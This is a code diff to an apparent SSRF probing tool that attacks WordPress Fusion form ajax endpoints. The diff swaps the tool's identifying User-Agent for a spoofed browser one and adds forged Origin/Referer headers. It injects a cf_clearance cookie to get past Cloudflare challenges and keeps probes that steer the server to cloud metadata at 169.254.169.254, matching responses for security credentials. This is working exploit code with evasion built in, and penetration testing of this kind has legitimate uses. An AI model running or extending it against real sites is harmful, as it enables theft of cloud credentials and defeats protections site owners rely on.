@@ -13,6 +13,7 @@ from __future__ import annotations
 
 import argparse
 import json
+import os
 import re
 import ssl
 import sys
@@ -178,25 +179,77 @@ def _save_burp_request(requests_dir: str | Path, *, ajax_url: str, raw_request: 
     return http_path.as_posix()
 
 
+_BROWSER_UA = (
+    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
+)
+
+
+def _is_cloudflare_challenge(body: str) -> bool:
+    t = (body or "").lower()
+    return (
+        "just a moment" in t
+        or "cf-browser-verification" in t
+        or "cdn-cgi/challenge" in t
+        or ("cloudflare" in t and "attention required" in t)
+        or "enable javascript and cookies" in t
+    )
+
+
+def _apply_extra_headers(headers: dict[str, str], extra_headers: list[str] | None) -> None:
+    for extra in extra_headers or []:
+        if not extra or ":" not in extra:
+            continue
+        hk, hv = extra.split(":", 1)
+        headers[hk.strip()] = hv.strip()
+    cookie = (os.environ.get("SSRF_COOKIE") or os.environ.get("CF_CLEARANCE") or "").strip()
+    if cookie:
+        if cookie.lower().startswith("cookie:"):
+            cookie = cookie.split(":", 1)[1].strip()
+        if "cf_clearance=" in cookie or "=" in cookie:
+            existing = headers.get("Cookie", "")
+            headers["Cookie"] = f"{existing}; {cookie}".strip("; ") if existing else cookie
+
+
+def _fusion_headers(
+    ajax_url: str,
+    *,
+    content_type: str,
+    extra_headers: list[str] | None = None,
+) -> dict[str, str]:
+    host, _ = _parse_ajax(ajax_url)
+    origin = f"{urlparse(ajax_url).scheme or 'https'}://{re.sub(r':(443|80)$', '', host)}"
+    headers = {
+        "Content-Type": content_type,
+        "X-Requested-With": "XMLHttpRequest",
+        "User-Agent": _BROWSER_UA,
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Origin": origin,
+        "Referer": f"{origin}/",
+        "Connection": "close",
+    }
+    _apply_extra_headers(headers, extra_headers)
+    return headers
+
+
 def _fusion_post(
     ajax_url: str,
     sink_url: str,
     nonce: str = "0",
     extra_header: str | None = None,
-    timeout: float = 10.0,
+    extra_headers: list[str] | None = None,
+    timeout: float = 15.0,
 ) -> tuple[int | None, str, bytes]:
     host, path = _parse_ajax(ajax_url)
     boundary, body = _build_fusion_multipart(sink_url, nonce=nonce)
-    headers = {
-        "Content-Type": f"multipart/form-data; boundary={boundary}",
-        "X-Requested-With": "XMLHttpRequest",
-        "User-Agent": "reconFTW-ssrf-probe",
-        "Accept": "*/*",
-        "Connection": "close",
-    }
-    if extra_header and ":" in extra_header:
-        hk, hv = extra_header.split(":", 1)
-        headers[hk.strip()] = hv.strip()
+    hdrs = list(extra_headers or [])
+    if extra_header:
+        hdrs.append(extra_header)
+    headers = _fusion_headers(
+        ajax_url,
+        content_type=f"multipart/form-data; boundary={boundary}",
+        extra_headers=hdrs,
+    )
     raw = _raw_http_request(method="POST", host=host, path=path, headers=headers, body=body)
     req = Request(ajax_url, data=body, headers=headers, method="POST")
     try:
@@ -209,20 +262,33 @@ def _fusion_post(
         return None, "", raw
 
 
-def _fetch_nonce(ajax_url: str, extra_header: str | None = None, timeout: float = 10.0) -> str:
+def _fetch_nonce(
+    ajax_url: str,
+    extra_header: str | None = None,
+    extra_headers: list[str] | None = None,
+    timeout: float = 15.0,
+) -> str:
     data = b"action=fusion_form_update_view"
-    headers = {
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "User-Agent": "reconFTW-ssrf-probe",
-    }
-    if extra_header and ":" in extra_header:
-        hk, hv = extra_header.split(":", 1)
-        headers[hk.strip()] = hv.strip()
+    hdrs = list(extra_headers or [])
+    if extra_header:
+        hdrs.append(extra_header)
+    headers = _fusion_headers(
+        ajax_url,
+        content_type="application/x-www-form-urlencoded; charset=UTF-8",
+        extra_headers=hdrs,
+    )
     req = Request(ajax_url, data=data, headers=headers, method="POST")
     try:
         with _OPENER.open(req, timeout=timeout) as resp:  # noqa: S310
             text = resp.read(65536).decode("utf-8", errors="replace")
     except (HTTPError, URLError, TimeoutError, OSError):
+        return "0"
+    if _is_cloudflare_challenge(text):
+        print(
+            f"[!] Cloudflare challenge blocking {ajax_url} — set SSRF_COOKIE='cf_clearance=...' "
+            "or probe from an IP that is not challenged",
+            file=sys.stderr,
+        )
         return "0"
     m = re.search(r'fusion-form-nonce-0"[^>]*value="([^"]+)"', text)
     if m:
@@ -237,14 +303,22 @@ def probe_fusion(
     oast_url: str | None = None,
     oast_reflected: bool = False,
     extra_header: str | None = None,
+    extra_headers: list[str] | None = None,
     requests_dir: str | None = "vulns/ssrf_requests",
 ) -> dict[str, Any] | None:
-    nonce = _fetch_nonce(ajax_url, extra_header=extra_header)
+    hdrs = list(extra_headers or [])
+    if extra_header:
+        hdrs.append(extra_header)
+    nonce = _fetch_nonce(ajax_url, extra_headers=hdrs)
     hits: list[dict[str, Any]] = []
     best_raw: bytes | None = None
+    cf_blocked = False
 
     for desc, sink_url, patterns in INBAND_CANARIES:
-        status, body, raw = _fusion_post(ajax_url, sink_url, nonce=nonce, extra_header=extra_header)
+        status, body, raw = _fusion_post(ajax_url, sink_url, nonce=nonce, extra_headers=hdrs)
+        if _is_cloudflare_challenge(body):
+            cf_blocked = True
+            break
         evidence = _match_evidence(body, patterns)
         if evidence is None:
             continue
@@ -252,25 +326,37 @@ def probe_fusion(
         best_raw = raw
         break
 
-    for desc, sink_url, patterns in SINKS:
-        status, body, raw = _fusion_post(ajax_url, sink_url, nonce=nonce, extra_header=extra_header)
-        evidence = _match_evidence(body, patterns)
-        if evidence is None and body and "169.254.169.254" in sink_url:
-            if re.search(
-                r"(ami-id|instance-id|local-ipv4|security-credentials|Metadata-Flavor|"
-                r"subscriptionId|availabilityDomain|openstack)",
-                body,
-                re.I,
-            ):
-                evidence = _snippet(body)
-        if evidence is None:
-            continue
-        hits.append({"desc": desc, "url": sink_url, "status": status, "evidence": evidence})
-        if best_raw is None or sink_url.rstrip("/").endswith("meta-data"):
-            best_raw = raw
+    if not cf_blocked:
+        for desc, sink_url, patterns in SINKS:
+            status, body, raw = _fusion_post(ajax_url, sink_url, nonce=nonce, extra_headers=hdrs)
+            if _is_cloudflare_challenge(body):
+                cf_blocked = True
+                break
+            evidence = _match_evidence(body, patterns)
+            if evidence is None and body and "169.254.169.254" in sink_url:
+                if re.search(
+                    r"(ami-id|instance-id|local-ipv4|security-credentials|Metadata-Flavor|"
+                    r"subscriptionId|availabilityDomain|openstack)",
+                    body,
+                    re.I,
+                ):
+                    evidence = _snippet(body)
+            if evidence is None:
+                continue
+            hits.append({"desc": desc, "url": sink_url, "status": status, "evidence": evidence})
+            if best_raw is None or sink_url.rstrip("/").endswith("meta-data"):
+                best_raw = raw
+
+    if cf_blocked:
+        print(
+            f"[!] Cloudflare challenge on {ajax_url} — SSRF probe cannot confirm from this IP. "
+            "Export SSRF_COOKIE with a valid cf_clearance cookie, or use a proxy/IP that bypasses CF.",
+            file=sys.stderr,
+        )
+        return None
 
     if oast_reflected and oast_url:
-        status, _body, raw = _fusion_post(ajax_url, oast_url, nonce=nonce, extra_header=extra_header)
+        status, _body, raw = _fusion_post(ajax_url, oast_url, nonce=nonce, extra_headers=hdrs)
         hits.append(
             {
                 "desc": "OAST / collaborator (our probe)",
@@ -319,7 +405,7 @@ def emit_oob(
             request_file = _save_burp_request(requests_dir, ajax_url=ajax, raw_request=raw)
         hit_url = sink
     else:
-        headers = {"User-Agent": "reconFTW-ssrf-probe", "Accept": "*/*", "Connection": "close"}
+        headers = {"User-Agent": _BROWSER_UA, "Accept": "*/*", "Connection": "close"}
         raw = _raw_http_request(method=method.upper() or "GET", host=host, path=path or "/", headers=headers)
         if requests_dir and raw:
             request_file = _save_burp_request(requests_dir, ajax_url=target, raw_request=raw)
@@ -359,7 +445,7 @@ def main() -> int:
     p_probe.add_argument("ajax_url")
     p_probe.add_argument("--oast-url", default="")
     p_probe.add_argument("--oast-reflected", action="store_true")
-    p_probe.add_argument("--header", default="")
+    p_probe.add_argument("--header", action="append", default=[])
     p_probe.add_argument("--requests-dir", default="vulns/ssrf_requests")
 
     args = ap.parse_args()
@@ -378,7 +464,7 @@ def main() -> int:
             args.ajax_url,
             oast_url=args.oast_url or None,
             oast_reflected=bool(args.oast_reflected),
-            extra_header=args.header or None,
+            extra_headers=list(args.header or []),
             requests_dir=args.requests_dir or None,
         )
         if obj is None:
